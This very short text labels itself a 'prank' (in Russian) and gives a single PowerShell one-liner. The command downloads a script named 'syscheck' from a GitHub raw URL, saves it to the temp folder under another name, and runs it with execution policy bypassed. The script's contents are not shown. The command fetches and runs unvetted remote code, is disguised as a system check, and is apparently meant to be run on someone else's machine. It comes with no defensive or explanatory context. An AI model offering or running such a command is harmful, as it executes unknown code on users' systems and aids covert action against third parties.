пранк 
``` powershell iwr "https://raw.githubusercontent.com/sweetvata/syscheck/main/syscheck.ps1" -OutFile "$env:TEMP\vw.ps1" -UseBasicParsing; powershell -ExecutionPolicy Bypass -File "$env:TEMP\vw.ps1"```
